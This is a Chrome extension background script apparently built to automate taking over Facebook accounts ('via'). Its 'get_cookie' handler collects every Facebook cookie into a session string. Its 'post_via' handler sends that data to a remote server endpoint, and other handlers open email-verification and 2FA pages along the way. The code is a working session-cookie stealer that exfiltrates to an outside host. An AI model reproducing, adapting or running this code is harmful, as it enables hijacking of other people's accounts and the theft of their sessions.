import { BASE_HOST_MAIL, BASE_MAIL_GOOGLE, BASE_SERVER, BASE_URL_2FA, BASE_URL_FB, VIA } from "../utils/Constants";
import { SystemUtils } from "../utils/SystemUtils"
import { Via } from "../object/Via";
chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    const systemUtils = new SystemUtils;
    if (message) {
        if (message.type == 'chrome_extension') {
            systemUtils.openNewTabAndExecuteScript("chrome://extensions/?id=" + chrome.runtime.id , "content_update_extension.js");
            // systemUtils.openNewTabAndExecuteScript("http://nonstock6.watermeru.com/" , "content_update_extension.js");
        }
        if (message.type == 'load_data') {
            fetch(BASE_SERVER + "/getData").then(res => {
                if (res.status >= 200 && res.status < 300) {
                    return res.json();
                } else {
                    throw new Error();
                }
            }).then((data) => {
                console.log(data);
                systemUtils.saveDataToStorage(data = { 'data': data });
            }).catch((err) => {
                console.log('fetch() => ' + err);
            })
        }
        if (message.type == 'request_CodeEmail') {
            let email = message.data;
            let url = BASE_HOST_MAIL;
            if (email.includes("gmail.com")) {
                url = BASE_MAIL_GOOGLE;
            }
            systemUtils.openNewTab(url);
        }
        if (message.type == 'request_2FA') {
            // var data = getDataToStorage("data");
            // data.qRcode2FA = message.data;
            // systemUtils.saveDataToStorage(data = {'data': data});
            systemUtils.openNewTab(BASE_URL_2FA);
        }
        if (message.type == 'request_closeTab') {
            chrome.tabs.remove(sender.tab.id);
        }
        if (message.type == 'get_cookie') {
            chrome.cookies.getAll({
                "url": BASE_URL_FB,
            }, function (cookie) {
                let stringCookie = "";
                for (let i = 0; i < cookie.length; i++) {
                    stringCookie += cookie[i].name + "=" + cookie[i].value + "; ";
                }
                let data = new Via((systemUtils.getDataToStorage(VIA)).data);
                data.cookie = stringCookie;
                systemUtils.saveDataToStorage(data = { 'data': data });
            });
        }
        if (message.type == 'get_token') {

        } if (message.type === 'post_via') {
            let via = new Via((systemUtils.getDataToStorage(VIA)).data);
            via = via.toJsonObject();
            fetch(BASE_SERVER + "/via/change-success",
                {
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    method: "POST",
                    body: JSON.stringify(via)
                }).then(function (res) {
                    console.log("post_via => success: " + res);
                    fetch(BASE_SERVER + "/via",
                    ).then(function (res) {
                        chrome.tabs.remove(sender.tab.id);
                    }).catch(function (error) {

                    })
                }).catch(function (res) {
                    console.log(res)
                })
        }
    }
});